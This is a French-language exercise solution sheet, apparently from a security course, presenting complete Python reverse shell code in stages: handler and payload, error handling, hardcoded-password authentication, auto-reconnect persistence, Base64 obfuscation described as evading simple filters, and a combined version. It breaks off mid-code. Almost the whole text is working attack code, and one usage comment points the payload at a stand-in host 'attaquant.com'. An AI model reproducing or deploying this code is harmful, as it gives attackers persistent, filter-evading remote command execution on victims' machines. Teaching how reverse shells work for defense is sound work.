================================================================================
# Exercice 18: SOLUTIONS COMPLÈTES - REVERSE SHELL EN PYTHON
================================================================================

AVERTISSEMENT:
Ces solutions sont fournies uniquement à titre d'apprentissage et de référence.
L'utilisation de ces techniques sur des systèmes non autorisés est ILLÉGALE.

================================================================================
## Défi 1: Reverse Shell Basique (Fondations)
================================================================================

SOLUTION 1 : Reverse Shell Basique Complète

```python
#!/usr/bin/env python3
"""
Solution Défi 1: Reverse Shell Basique

Architecture:
- Handler: Écoute sur localhost:5000, envoie commandes, reçoit résultats
- Payload: Accepte connexions, exécute commandes, renvoie output
"""

```python
import socket
import subprocess
import threading
import time
from typing import Optional

class ReverseShellBasic:
    """Reverse Shell simple et fonctionnelle"""

    # =========================================================================
    # HANDLER (Serveur côté Attaquant)
    # =========================================================================

    class Handler:
        """
        Handler: Écoute les connexions du payload
        """
        def __init__(self, port: int = 5000):
            self.port = port
            self.server_socket = None
            self.client_socket = None

        def demarrer(self):
            """Démarre le handler et accepte une connexion"""
            try:
                # Créer socket serveur
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                # Lier et écouter
                self.server_socket.bind(('0.0.0.0', self.port))
                self.server_socket.listen(1)

                print(f"[HANDLER] Démarré sur 0.0.0.0:{self.port}")
                print(f"[HANDLER] En attente de connexion...")

                # Accepter une connexion
                self.client_socket, addr = self.server_socket.accept()
                print(f"[HANDLER] Payload connecté depuis {addr}")

                # Boucle interactive
                self.boucle_interactive()

            except Exception as e:
                print(f"[ERREUR HANDLER] {e}")

        def boucle_interactive(self):
            """Boucle pour envoyer commandes et recevoir résultats"""
            print("[HANDLER] Boucle interactive (tapez 'exit' pour quitter)")
            print("-" * 70)

            try:
                while True:
                    # Lire commande
                    commande = input("\n[shell] > ").strip()

                    # Vérifier exit
                    if commande.lower() in ['exit', 'quit']:
                        print("[HANDLER] Fermeture...")
                        break

                    if not commande:
                        continue

                    # Envoyer commande
                    try:
                        self.client_socket.send(commande.encode('utf-8') + b'\n')
                    except Exception as e:
                        print(f"[ERREUR] Impossible d'envoyer: {e}")
                        break

                    # Recevoir résultats
                    try:
                        resultats = self.client_socket.recv(4096).decode('utf-8')
                        if resultats:
                            print(resultats, end='')
                        else:
                            print("[HANDLER] Connexion fermée")
                            break
                    except Exception as e:
                        print(f"[ERREUR] Impossible de recevoir: {e}")
                        break

            except KeyboardInterrupt:
                print("\n[HANDLER] Interruption")

            finally:
                self.fermer()

        def fermer(self):
            """Ferme les sockets"""
            if self.client_socket:
                self.client_socket.close()
            if self.server_socket:
                self.server_socket.close()
            print("[HANDLER] Sockets fermées")

    # =========================================================================
    # PAYLOAD (Client côté Cible)
    # =========================================================================

    class Payload:
        """
        Payload: Se connecte au handler et exécute des commandes
        """
        def __init__(self, attaquant_ip: str, attaquant_port: int = 5000):
            self.attaquant_ip = attaquant_ip
            self.attaquant_port = attaquant_port
            self.socket = None

        def connecter(self) -> bool:
            """Établit la connexion au handler"""
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.attaquant_ip, self.attaquant_port))
                print(f"[PAYLOAD] Connecté à {self.attaquant_ip}:{self.attaquant_port}")
                return True
            except Exception as e:
                print(f"[ERREUR PAYLOAD] Impossible de se connecter: {e}")
                return False

        def boucle_reception(self):
            """Boucle: reçoit commandes, exécute, renvoie résultats"""
            if not self.socket:
                print("[ERREUR] Pas de connexion")
                return

            print(f"[PAYLOAD] Boucle de réception")

            try:
                while True:
                    # Recevoir commande
                    donnees = self.socket.recv(1024)

                    if not donnees:
                        print("[PAYLOAD] Déconnexion du handler")
                        break

                    # Décoder et exécuter
                    commande = donnees.decode('utf-8').strip()

                    if commande:
                        resultats = self._executer_commande(commande)
                    else:
                        resultats = ""

                    # Envoyer résultats
                    try:
                        self.socket.send(resultats.encode('utf-8'))
                    except Exception as e:
                        print(f"[ERREUR] Impossible d'envoyer: {e}")
                        break

            except Exception as e:
                print(f"[ERREUR PAYLOAD] {e}")

            finally:
                self.fermer()

        def _executer_commande(self, commande: str) -> str:
            """
            Exécute une commande et retourne l'output

            Args:
                commande: Commande à exécuter

            Returns:
                Sortie standard + erreurs
            """
            try:
                # Exécuter la commande
                process = subprocess.Popen(
                    commande,
                    shell=True,                    # Utiliser le shell
                    stdout=subprocess.PIPE,        # Capturer stdout
                    stderr=subprocess.STDOUT,      # Rediriger stderr
                    text=True
                )

                # Attendre avec timeout 30s
                try:
                    stdout, _ = process.communicate(timeout=30)
                    return stdout
                except subprocess.TimeoutExpired:
                    process.kill()
                    return "[TIMEOUT] Commande dépassée 30 secondes\n"

            except Exception as e:
                return f"[ERREUR EXÉCUTION] {str(e)}\n"

        def fermer(self):
            """Ferme la connexion"""
            if self.socket:
                self.socket.close()
            print("[PAYLOAD] Connexion fermée")

```
# ============================================================================
# UTILISATION
# ============================================================================

```python
def demo_reverse_shell_basique():
    """Démonstration complète en local"""

    # Créer handler et payload
    handler = ReverseShellBasic.Handler(port=5000)
    payload = ReverseShellBasic.Payload("localhost", 5000)

    # Démarrer handler dans un thread
    handler_thread = threading.Thread(target=handler.demarrer)
    handler_thread.daemon = True
    handler_thread.start()

    # Attendre que handler soit prêt
    time.sleep(1)

    # Connecter payload dans un thread
    payload_thread = threading.Thread(
        target=lambda: payload.connecter() and payload.boucle_reception()
    )
    payload_thread.daemon = True
    payload_thread.start()

    # Attendre threads
    handler_thread.join()

if __name__ == "__main__":
    print("Défi 1 : Reverse Shell Basique")
    demo_reverse_shell_basique()
```
```

EXPLICATIONS:

1. **Handler (Serveur)**:
   - Crée socket serveur sur port 5000
   - Accepte UNE connexion du payload
   - Boucle interactive: reçoit commandes, envoie via socket
   - Affiche résultats reçus du payload

2. **Payload (Client)**:
   - Se connecte au handler
   - Boucle infinie: reçoit commandes, exécute, renvoie output
   - Utilise subprocess pour exécuter les commandes

3. **Communication**:
   - Handler envoie: "whoami\n"
   - Payload reçoit, exécute, retourne résultat
   - Boucle jusqu'à "exit"

4. **Architecture**:
   ```
   Handler (localhost:5000) ←→ Payload (localhost client)
                   ↓
```python
           Commande "whoami"
                   ↓
           Exécution subprocess
                   ↓
           Résultat "username"
                   ↓
           Affichage sur handler
```
   ```

================================================================================
## Défi 2: Gestion des Erreurs et Robustesse
================================================================================

SOLUTION 2 : Avec Gestion d'Erreurs Complète

```python
```python
import socket
import subprocess
import threading
import time

class ReverseShellRobuste:
    """Reverse Shell avec gestion d'erreurs et timeouts"""

    class Handler:
        def __init__(self, port: int = 5000, timeout_accept: int = 30):
            self.port = port
            self.timeout_accept = timeout_accept
            self.server_socket = None
            self.client_socket = None

        def demarrer(self):
            """Démarre avec timeouts et gestion d'erreurs"""
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                # Définir timeout pour accept() (30s)
                self.server_socket.settimeout(self.timeout_accept)

                self.server_socket.bind(('0.0.0.0', self.port))
                self.server_socket.listen(1)

                print(f"[HANDLER] Démarré sur 0.0.0.0:{self.port}")
                print(f"[HANDLER] Timeout d'attente: {self.timeout_accept}s")
                print(f"[HANDLER] En attente de connexion...")

                try:
                    self.client_socket, addr = self.server_socket.accept()
                    print(f"[OK] Payload connecté depuis {addr}")

                    # Mettre timeout sur le socket client
                    self.client_socket.settimeout(10)  # 10s pour recv

                    self.boucle_interactive()

                except socket.timeout:
                    print(f"[ERREUR] Timeout: aucune connexion après {self.timeout_accept}s")

            except OSError as e:
                print(f"[ERREUR OS] {e}")
            except Exception as e:
                print(f"[ERREUR] {e}")
            finally:
                self.fermer()

        def boucle_interactive(self):
            """Boucle avec gestion d'erreurs"""
            print("[HANDLER] Boucle interactive")

            try:
                while True:
                    commande = input("\n[shell] > ").strip()

                    if commande.lower() in ['exit', 'quit']:
                        print("[INFO] Fermeture...")
                        break

                    if not commande:
                        continue

                    # Envoyer avec gestion d'erreurs
                    if not self._envoyer_commande(commande):
                        break

                    # Recevoir avec gestion d'erreurs
                    if not self._recevoir_resultats():
                        break

            except KeyboardInterrupt:
                print("\n[INFO] Interruption utilisateur")
            except Exception as e:
                print(f"[ERREUR] {e}")

        def _envoyer_commande(self, commande: str) -> bool:
            """Envoie commande avec gestion d'erreurs"""
            try:
                self.client_socket.send(commande.encode('utf-8') + b'\n')
                return True
            except socket.timeout:
                print("[ERREUR] Timeout lors de l'envoi")
                return False
            except socket.error as e:
                print(f"[ERREUR SOCKET] Impossible d'envoyer: {e}")
                return False
            except UnicodeEncodeError as e:
                print(f"[ERREUR ENCODAGE] Caractères invalides: {e}")
                return False

        def _recevoir_resultats(self) -> bool:
            """Reçoit résultats avec gestion d'erreurs"""
            try:
                resultats = self.client_socket.recv(4096).decode('utf-8')

                if resultats:
                    print(resultats, end='')
                    return True
                else:
                    print("[INFO] Connexion fermée par le payload")
                    return False

            except socket.timeout:
                print("[ERREUR] Timeout lors de la réception")
                return False
            except socket.error as e:
                print(f"[ERREUR SOCKET] {e}")
                return False
            except UnicodeDecodeError as e:
                print(f"[ERREUR DÉCODAGE] Données invalides: {e}")
                return False

        def fermer(self):
            """Ferme proprement"""
            if self.client_socket:
                try:
                    self.client_socket.close()
                except:
                    pass
            if self.server_socket:
                try:
                    self.server_socket.close()
                except:
                    pass
            print("[INFO] Sockets fermées")

    class Payload:
        def __init__(self, attaquant_ip: str, attaquant_port: int = 5000):
            self.attaquant_ip = attaquant_ip
            self.attaquant_port = attaquant_port
            self.socket = None

        def connecter(self) -> bool:
            """Connecte avec gestion d'erreurs"""
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.attaquant_ip, self.attaquant_port))
                self.socket.settimeout(10)  # Timeout recv 10s

                print(f"[PAYLOAD] Connecté à {self.attaquant_ip}:{self.attaquant_port}")
                return True

            except socket.timeout:
                print("[ERREUR] Timeout connexion")
                return False
            except socket.error as e:
                print(f"[ERREUR] Impossible de se connecter: {e}")
                return False
            except Exception as e:
                print(f"[ERREUR] {e}")
                return False

        def boucle_reception(self):
            """Boucle avec gestion d'erreurs"""
            if not self.socket:
                return

            print("[PAYLOAD] Boucle de réception")

            try:
                while True:
                    try:
                        donnees = self.socket.recv(1024)

                        if not donnees:
                            print("[PAYLOAD] Connexion fermée")
                            break

                        commande = donnees.decode('utf-8').strip()

                        if not commande:
                            continue

                        # Exécuter avec timeout
                        resultats = self._executer_commande(commande)

                        # Envoyer résultats
                        try:
                            self.socket.send(resultats.encode('utf-8'))
                        except socket.error as e:
                            print(f"[ERREUR] Impossible d'envoyer: {e}")
                            break

                    except socket.timeout:
                        # Pas de données pendant 10s, continue
                        continue
                    except UnicodeDecodeError:
                        print("[ERREUR] Données non-UTF8")
                        continue

            except Exception as e:
                print(f"[ERREUR] {e}")

            finally:
                self.fermer()

        def _executer_commande(self, commande: str) -> str:
            """Exécute avec timeout strict"""
            try:
                process = subprocess.Popen(
                    commande,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )

                try:
                    stdout, _ = process.communicate(timeout=30)
                    return stdout

                except subprocess.TimeoutExpired:
                    process.kill()
                    return "[TIMEOUT] Commande dépassée 30s\n"

            except FileNotFoundError:
                return "[ERREUR] Commande non trouvée\n"
            except Exception as e:
                return f"[ERREUR] {str(e)}\n"

        def fermer(self):
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
            print("[PAYLOAD] Déconnecté")
```
```

AMÉLIORATIONS:

1. **Timeouts**:
   - `accept()` timeout 30s
   - `recv()` timeout 10s
   - Commandes subprocess timeout 30s

2. **Exceptions Spécifiques**:
   - `socket.timeout` : Timeout
   - `socket.error` : Erreurs réseau
   - `UnicodeEncodeError/DecodeError` : Encodage

3. **Gestion d'Erreurs**:
   - Continuer si timeout recv (pas grave)
   - Arrêter si socket error (grave)
   - Afficher messages d'erreur clairs

4. **Fermeture Propre**:
   - Utiliser try/finally
   - Fermer les ressources
   - Ignorer exceptions lors fermeture

================================================================================
## Défi 3: Authentification Simple
================================================================================

SOLUTION 3 : Avec Authentification SHA256

```python
```python
import socket
import subprocess
import hashlib
import threading
import time

class ReverseShellAvecAuth:
    """Reverse Shell avec authentification"""

    class Handler:
        # Mot de passe partagé
        PASSWORD = "admin123"
        PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

        def __init__(self, port: int = 5000):
            self.port = port
            self.server_socket = None
            self.client_socket = None
            self.authentifie = False

        def demarrer(self):
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind(('0.0.0.0', self.port))
                self.server_socket.listen(1)

                print(f"[HANDLER] En attente de connexion...")
                self.client_socket, addr = self.server_socket.accept()

                print(f"[HANDLER] Client connecté depuis {addr}")

                # Authentification d'abord
                if self._authentifier():
                    self.boucle_interactive()
                else:
                    print("[HANDLER] Authentification échouée")

            except Exception as e:
                print(f"[ERREUR] {e}")
            finally:
                self.fermer()

        def _authentifier(self) -> bool:
            """
            Authentifie le client
            Handler demande password, envoie hash
            """
            try:
                # Demander password
                password = input("[AUTH] Mot de passe: ")

                # Calculer hash
                password_hash = hashlib.sha256(password.encode()).hexdigest()

                # Envoyer hash au client
                self.client_socket.send(password_hash.encode('utf-8'))

                # Recevoir réponse: "OK" ou "NOK"
                response = self.client_socket.recv(10).decode('utf-8').strip()

                if response == "OK":
                    print("[AUTH] Authentification réussie")
                    self.authentifie = True
                    return True
                else:
                    print("[AUTH] Authentification échouée (mauvais password)")
                    return False

            except Exception as e:
                print(f"[ERREUR AUTH] {e}")
                return False

        def boucle_interactive(self):
            if not self.authentifie:
                print("[ERREUR] Non authentifié")
                return

            print("[HANDLER] Boucle interactive")

            try:
                while True:
                    commande = input("\n[shell] > ").strip()

                    if commande.lower() in ['exit', 'quit']:
                        break

                    if not commande:
                        continue

                    self.client_socket.send(commande.encode('utf-8') + b'\n')
                    resultats = self.client_socket.recv(4096).decode('utf-8')

                    if resultats:
                        print(resultats, end='')
                    else:
                        break

            except Exception as e:
                print(f"[ERREUR] {e}")

        def fermer(self):
            if self.client_socket:
                self.client_socket.close()
            if self.server_socket:
                self.server_socket.close()

    class Payload:
        # Hash du password
        PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

        def __init__(self, attaquant_ip: str, attaquant_port: int = 5000):
            self.attaquant_ip = attaquant_ip
            self.attaquant_port = attaquant_port
            self.socket = None
            self.authentifie = False

        def connecter(self) -> bool:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.attaquant_ip, self.attaquant_port))
                print("[PAYLOAD] Connecté")

                # Authentification
                if self._authentifier():
                    return True
                else:
                    self.socket.close()
                    return False

            except Exception as e:
                print(f"[ERREUR] {e}")
                return False

        def _authentifier(self) -> bool:
            """
            Authentifie auprès du handler
            Reçoit hash du password du handler
            Compare avec notre hash
            """
            try:
                # Recevoir hash du handler
                server_hash = self.socket.recv(64).decode('utf-8').strip()

                print(f"[PAYLOAD] Hash reçu du handler")

                # Comparer avec notre hash
                if server_hash == self.PASSWORD_HASH:
                    print("[PAYLOAD] Authentification réussie")
                    self.socket.send(b"OK")
                    self.authentifie = True
                    return True
                else:
                    print("[PAYLOAD] Authentification échouée (hash incorrect)")
                    self.socket.send(b"NOK")
                    return False

            except Exception as e:
                print(f"[ERREUR AUTH] {e}")
                self.socket.send(b"NOK")
                return False

        def boucle_reception(self):
            if not self.authentifie:
                print("[ERREUR] Non authentifié")
                return

            print("[PAYLOAD] Boucle de réception")

            try:
                while True:
                    donnees = self.socket.recv(1024)

                    if not donnees:
                        break

                    commande = donnees.decode('utf-8').strip()

                    if commande:
                        resultats = self._executer_commande(commande)
                    else:
                        resultats = ""

                    self.socket.send(resultats.encode('utf-8'))

            except Exception as e:
                print(f"[ERREUR] {e}")

            finally:
                self.socket.close()

        def _executer_commande(self, commande: str) -> str:
            try:
                process = subprocess.Popen(
                    commande,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )

                try:
                    stdout, _ = process.communicate(timeout=30)
                    return stdout
                except subprocess.TimeoutExpired:
                    process.kill()
                    return "[TIMEOUT]\n"

            except Exception as e:
                return f"[ERREUR] {str(e)}\n"
```
```

EXPLICATIONS:

1. **Hash au lieu Password brut**:
   - Handler: reçoit password → calcule hash → envoie
   - Payload: reçoit hash → compare avec son hash
   - Si match: "OK", sinon "NOK"

2. **Avantages**:
   - Password jamais transmis en clair
   - Hash déterministe (même password = même hash)
   - Signature connue uniquement de handler et payload

3. **Limitations**:
   - Hash visible en clair (améliorer avec chiffrement)
   - Pas de salt (améliorer avec PBKDF2)
   - Rainbow tables possibles (mot de passe faible)

================================================================================
## Défi 4: Persistance avec Reconnexion Automatique
================================================================================

SOLUTION 4 : Reconnexion Automatique Avec Backoff

```python
```python
import socket
import subprocess
import time
import threading

class ReverseShellAvecPersistance:
    """Reverse Shell avec reconnexion automatique"""

    class Payload:
        def __init__(self, attaquant_ip: str, attaquant_port: int = 5000,
                     max_delai: int = 60):
            self.attaquant_ip = attaquant_ip
            self.attaquant_port = attaquant_port
            self.socket = None
            self.max_delai = max_delai
            self.tentative = 0
            self.connecte = False

        def connecter_avec_persistance(self):
            """
            Connecte avec retry automatique et backoff exponentiel

            Délais: 1s, 2s, 4s, 8s, 16s, 32s, 60s, 60s, ...
            """
            self.tentative = 0
            delai_base = 1

            while True:
                self.tentative += 1

                try:
                    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.socket.connect((self.attaquant_ip, self.attaquant_port))

                    print(f"[PERSISTANCE] Connecté après {self.tentative} tentative(s)")
                    self.connecte = True
                    self.tentative = 0  # Reset après succès
                    return True

                except Exception as e:
                    # Calculer délai avec backoff exponentiel
                    # delai = min(1 * 2^(tentative-1), 60)
                    delai = min(delai_base * (2 ** (self.tentative - 1)), self.max_delai)

                    print(f"[PERSISTANCE] Tentative {self.tentative} échouée")
                    print(f"[PERSISTANCE] Prochaine tentative dans {delai}s...")

                    self.connecte = False
                    time.sleep(delai)

        def boucle_reception_persistante(self):
            """
            Boucle qui reconnecte automatiquement si disconnexion
            """
            while True:
                # Connecter si nécessaire
                if not self.connecte:
                    self.connecter_avec_persistance()

                try:
                    # Recevoir commande
                    donnees = self.socket.recv(1024)

                    if not donnees:
                        print("[PERSISTANCE] Déconnexion du handler")
                        self.connecte = False
                        time.sleep(1)
                        continue

                    # Exécuter commande
                    commande = donnees.decode('utf-8').strip()

                    if commande:
                        resultats = self._executer_commande(commande)
                    else:
                        resultats = ""

                    # Envoyer résultats
                    try:
                        self.socket.send(resultats.encode('utf-8'))
                    except Exception as e:
                        print(f"[PERSISTANCE] Erreur envoi: {e}")
                        self.connecte = False

                except Exception as e:
                    print(f"[PERSISTANCE] Erreur reception: {e}")
                    self.connecte = False
                    time.sleep(1)

        def _executer_commande(self, commande: str) -> str:
            try:
                process = subprocess.Popen(
                    commande,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )

                try:
                    stdout, _ = process.communicate(timeout=30)
                    return stdout
                except subprocess.TimeoutExpired:
                    process.kill()
                    return "[TIMEOUT]\n"

            except Exception as e:
                return f"[ERREUR] {str(e)}\n"

```
# UTILISATION:
# payload = ReverseShellAvecPersistance.Payload("attaquant.com", 5000)
# payload.boucle_reception_persistante()  # Boucle infinie avec reconnexion
```

EXPLICATIONS:

1. **Backoff Exponentiel**:
   ```
   Tentative 1: 1s    (1 * 2^0 = 1)
   Tentative 2: 2s    (1 * 2^1 = 2)
   Tentative 3: 4s    (1 * 2^2 = 4)
   Tentative 4: 8s    (1 * 2^3 = 8)
   Tentative 5: 16s   (1 * 2^4 = 16)
   Tentative 6: 32s   (1 * 2^5 = 32)
   Tentative 7+: 60s  (max capping)
   ```

2. **Pourquoi**:
   - Évite surcharge réseau
   - Donne temps pour redémarrage handler
   - Progressif (rapide au début, puis backoff)

3. **Comportement**:
   - Connexion perdue → attendre 1s → retry
   - Échoue → attendre 2s → retry
   - Etc. jusqu'à succès

================================================================================
## Défi 5: Encodage / Obfuscation Basique
================================================================================

SOLUTION 5 : Obfuscation Base64

```python
```python
import socket
import subprocess
import base64

class ReverseShellObfusquee:
    """Reverse Shell avec encodage Base64"""

    class Handler:
        def __init__(self, port: int = 5000):
            self.port = port
            self.server_socket = None
            self.client_socket = None

        def demarrer(self):
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind(('0.0.0.0', self.port))
                self.server_socket.listen(1)

                print("[HANDLER] Démarré...")
                self.client_socket, addr = self.server_socket.accept()
                print(f"[HANDLER] Payload connecté")

                self.boucle_interactive()

            except Exception as e:
                print(f"[ERREUR] {e}")
            finally:
                self.fermer()

        def _encoder_message(self, message: str) -> bytes:
            """Encode un message en Base64"""
            return base64.b64encode(message.encode('utf-8'))

        def _decoder_message(self, donnees: bytes) -> str:
            """Décode un message Base64"""
            try:
                return base64.b64decode(donnees).decode('utf-8')
            except Exception:
                return ""

        def boucle_interactive(self):
            """Boucle interactive avec communications encodées"""
            print("[HANDLER] Boucle interactive (encodage Base64)")

            try:
                while True:
                    commande = input("\n[shell] > ").strip()

                    if commande.lower() in ['exit', 'quit']:
                        break

                    if not commande:
                        continue

                    # Encoder commande en Base64
                    commande_encodee = self._encoder_message(commande)

                    # Envoyer
                    try:
                        self.client_socket.send(commande_encodee + b'\n')
                    except Exception as e:
                        print(f"[ERREUR] {e}")
                        break

                    # Recevoir résultats encodés
                    try:
                        resultats_encodes = self.client_socket.recv(4096)

                        if resultats_encodes:
                            # Décoder
                            resultats = self._decoder_message(resultats_encodes)

                            if resultats:
                                print(resultats, end='')
                        else:
                            break

                    except Exception as e:
                        print(f"[ERREUR] {e}")
                        break

            except KeyboardInterrupt:
                print("\n[INFO] Interruption")

        def fermer(self):
            if self.client_socket:
                self.client_socket.close()
            if self.server_socket:
                self.server_socket.close()

    class Payload:
        def __init__(self, attaquant_ip: str, attaquant_port: int = 5000):
            self.attaquant_ip = attaquant_ip
            self.attaquant_port = attaquant_port
            self.socket = None

        def connecter(self) -> bool:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.attaquant_ip, self.attaquant_port))
                return True
            except Exception as e:
                print(f"[ERREUR] {e}")
                return False

        def _encoder_message(self, message: str) -> bytes:
            """Encode en Base64"""
            return base64.b64encode(message.encode('utf-8'))

        def _decoder_message(self, donnees: bytes) -> str:
            """Décode Base64"""
            try:
                return base64.b64decode(donnees).decode('utf-8')
            except Exception:
                return ""

        def boucle_reception(self):
            """Boucle avec communications encodées"""
            if not self.socket:
                return

            print("[PAYLOAD] Boucle (encodage Base64)")

            try:
                while True:
                    # Recevoir commande encodée
                    donnees_encodees = self.socket.recv(1024)

                    if not donnees_encodees:
                        break

                    # Décoder commande
                    commande = self._decoder_message(donnees_encodees)

                    if not commande:
                        continue

                    # Exécuter
                    resultats = self._executer_commande(commande)

                    # Encoder résultats
                    resultats_encodes = self._encoder_message(resultats)

                    # Envoyer encodés
                    try:
                        self.socket.send(resultats_encodes)
                    except Exception as e:
                        break

            except Exception as e:
                print(f"[ERREUR] {e}")

            finally:
                self.socket.close()

        def _executer_commande(self, commande: str) -> str:
            try:
                process = subprocess.Popen(
                    commande,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )

                try:
                    stdout, _ = process.communicate(timeout=30)
                    return stdout
                except subprocess.TimeoutExpired:
                    process.kill()
                    return "[TIMEOUT]\n"

            except Exception as e:
                return f"[ERREUR] {str(e)}\n"

```
# EXEMPLE D'ENCODAGE:
# "whoami"        → "d2hvYW1p"
# "root"          → "cm9vdA=="
# Trafic en Base64 contourne les filtres simples
```

================================================================================
## Défi 6: Exécution de Commandes Avancées
================================================================================

SOLUTION 6 : Commandes Avancées Avec Persistance de Répertoire

```python
```python
import os
import subprocess

class PayloadAvance:
    """Payload avec support de commandes avancées"""

    def __init__(self):
        self.current_dir = os.getcwd()

    def _executer_commande_avancee(self, commande: str) -> str:
        """
        Exécute commandes avancées:
        - Pipes: ls | grep txt
        - Redirections: echo > fichier
        - cd: change directory persistant
        - Variables: $HOME, %USERPROFILE%
        """

        # Gérer le "cd" spécial
        if commande.startswith("cd "):
            nouveau_dir = commande[3:].strip()
            try:
                # Gérer ~ (home directory)
                if nouveau_dir == "~":
                    nouveau_dir = os.path.expanduser("~")
                elif nouveau_dir.startswith("~/"):
                    nouveau_dir = os.path.expanduser(nouveau_dir)

                os.chdir(nouveau_dir)
                self.current_dir = os.getcwd()
                return f"Répertoire courant: {self.current_dir}\n"

            except FileNotFoundError:
                return f"Erreur: Répertoire non trouvé: {nouveau_dir}\n"
            except Exception as e:
                return f"Erreur cd: {e}\n"

        # Commandes normales
        try:
            process = subprocess.Popen(
                commande,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                cwd=self.current_dir  # IMPORTANT: exécuter dans current_dir
            )

            try:
                stdout, _ = process.communicate(timeout=30)
                return stdout

            except subprocess.TimeoutExpired:
                process.kill()
                return "[TIMEOUT] Commande dépassée 30s\n"

        except Exception as e:
            return f"[ERREUR] {str(e)}\n"

    def boucle_test(self):
        """Test les commandes"""
        commandes_test = [
            "whoami",
            "pwd",
            "ls",
            "cd /tmp",
            "pwd",
            "echo 'Test'",
            "ls | head -3",  # Avec pipe
        ]

        for cmd in commandes_test:
            print(f"\n$ {cmd}")
            resultat = self._executer_commande_avancee(cmd)
            print(resultat, end='')
```
```

================================================================================
DÉFI 7 & 8 : Obfuscation Avancée et Reverse Shell Complète
================================================================================

SOLUTION 7-8 : Reverse Shell Complète Avec Toutes les Features

```python
#!/usr/bin/env python3
"""
Solution Complète: Reverse Shell avec Authentification, Persistance, Obfuscation

Features:
- Authentification SHA256
- Reconnexion automatique
- Encodage Base64
- Gestion d'erreurs complète
- Support commandes avancées
"""

```python
import socket
import subprocess
import hashlib
import base64
import time
import os
from typing import Optional

class ReverseShellComplete:
    """Reverse Shell complète avec toutes les améliorations"""

    # Credentials partagées
    PASSWORD = "admin123"
    PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

    class Handler:
        def __init__(self, port: int = 5000):
            self.port = port
            self.server_socket = None
            self.client_socket = None

        def demarrer(self):
            """Démarre le handler"""
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind(('0.0.0.0', self.port))
                self.server_socket.listen(1)

                print(f"[HANDLER] Démarré sur 0.0.0.0:{self.port}")
                print("[HANDLER] En attente de connexion...")

                self.client_socket, addr = self.server_socket.accept()
                print(f"[HANDLER] Payload connecté depuis {addr}")

                # Authentification
                if self._authentifier():
                    self.boucle_interactive()
                else:
                    print("[HANDLER] Authentification échouée")

            except Exception as e:
                print(f"[ERREUR] {e}")
            finally:
                self.fermer()

        def _authentifier(self) -> bool:
            """Authentifie avec hash"""
            try:
                password = input("[AUTH] Mot de passe: ")
                password_hash = hashlib.sha256(password.encode()).hexdigest()

                self.client_socket.send(password_hash.encode('utf-8'))
                response = self.client_socket.recv(10).decode('utf-8').strip()

                if response == "OK":
                    print("[AUTH] ✓ Authentification réussie")
                    return True
                else:
                    print("[AUTH] ✗ Authentification échouée")
                    return False

            except Exception as e:
                print(f"[ERREUR] {e}")
                return False

        def _encoder_message(self, message: str) -> bytes:
            """Encode en Base64"""
            return base64.b64encode(message.encode('utf-8'))

        def _decoder_message(self, donnees: bytes) -> str:
            """Décode Base64"""
            try:
                return base64.b64decode(donnees).decode('utf-8')
            except:
                return ""

        def boucle_interactive(self):
            """Boucle interactive"""
            print("[HANDLER] Boucle interactive")
            print("[HINT] Commandes: whoami, pwd, ls, cd, exit")

            try:
                while True:
                    commande = input("\n[shell] > ").strip()

                    if commande.lower() in ['exit', 'quit']:
                        break

                    if not commande:
                        continue

                    # Encoder
                    commande_encodee = self._encoder_message(commande)

                    # Envoyer
                    try:
                        self.client_socket.send(commande_encodee + b'\n')
                    except Exception as e:
                        print(f"[ERREUR] {e}")
                        break

                    # Recevoir
                    try:
                        resultats_encodes = self.client_socket.recv(4096)

                        if resultats_encodes:
                            resultats = self._decoder_message(resultats_encodes)
                            if resultats:
                                print(resultats, end='')
                        else:
                            print("[INFO] Déconnecté")
                            break

                    except Exception as e:
                        print(f"[ERREUR] {e}")
                        break

            except KeyboardInterrupt:
                print("\n[INFO] Interruption")

        def fermer(self):
            if self.client_socket:
                self.client_socket.close()
            if self.server_socket:
                self.server_socket.close()
            print("[INFO] Fermeture")

    class Payload:
        def __init__(self, attaquant_ip: str, attaquant_port: int = 5000):
            self.attaquant_ip = attaquant_ip
            self.attaquant_port = attaquant_port
            self.socket = None
            self.current_dir = os.getcwd()

        def connecter_avec_persistance(self) -> bool:
            """Connecte avec reconnexion automatique"""
            tentative = 0
            delai_base = 1

            while True:
                tentative += 1
                try:
                    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.socket.connect((self.attaquant_ip, self.attaquant_port))
                    print(f"[PAYLOAD] Connecté")

                    # Authentification
                    if self._authentifier():
                        return True
                    else:
                        self.socket.close()
                        return False

                except Exception:
